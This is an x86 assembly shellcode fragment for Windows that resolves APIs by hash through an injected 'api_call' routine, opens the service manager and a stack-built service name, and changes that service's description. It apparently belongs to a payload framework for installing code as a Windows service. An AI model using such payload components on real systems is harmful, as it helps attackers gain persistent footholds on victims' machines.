;-----------------------------------------------------------------------------;
; Author: agix (florian.gaultier[at]gmail[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Size: 448 bytes
;-----------------------------------------------------------------------------;

[BITS 32]
; Input: EBP must be the address of 'api_call'.

push 0x000F003F
push 0x00000000
push 0x00000000
push 0x7636F067
call ebp 		;OpenSCManagerA
mov edi, eax
push 0x00464349
push 0x56524553
mov ecx, esp	;SVCNAME
push 0x000F01FF
push ecx
push eax
push 0x404B2856
call ebp 		;OpenServiceA
mov esi, eax
push 0x00464349
push 0x56524553
mov ecx, esp
push 0x00000000
push ecx
mov ecx, esp	;SVCDESCRIPTION
push ecx
push 0x00000001 ;SERVICE_CONFIG_DESCRIPTION
push eax
push 0xED35B087
call ebp 		;ChangeServiceConfig2A
push esi
push 0xAD77EADE	;CloseServiceHandle
call ebp
push edi
push 0xAD77EADE	;CloseServiceHandle
call ebp